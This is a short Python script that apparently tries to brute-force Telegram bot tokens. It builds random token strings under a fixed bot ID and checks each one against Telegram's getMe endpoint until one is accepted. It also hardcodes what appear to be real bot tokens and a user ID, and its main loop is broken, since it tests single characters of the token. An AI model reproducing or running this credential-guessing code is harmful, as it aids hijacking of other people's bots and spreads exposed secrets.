# from telethon import TelegramClient, events
# import requests
# import random
# import json


# # def generate_random_string():
# #     return '1720944012:AA' +''.join(random.choice('HABCDEFG') for _ in range(1)) +''.join(random.choice('JKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_') for _ in range(32))

# # def check_bot_status(token):
# #     return requests.get(f"https://api.telegram.org/bot{token}/getMe").json()

# # done = 6305901836
# # done1 = -1002054244635

# #  while True:
# #     json_data = check_bot_status(generate_random_string())
# #     if json_data.get("ok", False):
# #         print()
# #             break
# #         else:
# #             print(f"Invalid string: {generate_random_string()}. Trying again...")

# x = "https://api.telegram.org/bot6398099189:AAEZ-WSNCn2rshiCbfJxYS20O1hS94OIci4/getMe"
# y =  requests.get(x)
# print(y.content)

# while True:
#     json_data = x
#     if json_data.get("ok", False):
#         print(f"{y}")
#         break
#     else:
#         print(f"Invalid string. Trying again...")

import requests
import random

TELEGRAM_TOKEN = "6602606975:AAEMhPxDCwKy-w7OMa_5KugOcFah4-5v-uE"
TELEGRAM_USER_ID = 6305901836

def main():
    while True:
        # gen token
        tok = '1720944012:AA' + ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_') for _ in range(33))
        # resp
        for xx in tok:
            print(xx)
            chk = requests.get(f"https://api.telegram.org/bot{xx}/getMe").json()
            if chk.get("ok", False):
                print(f'''
                token = {xx}
                info == {chk}
                ''')
                break
            else:
                print(f"Invalid string {xx} . Trying again...")
main()


        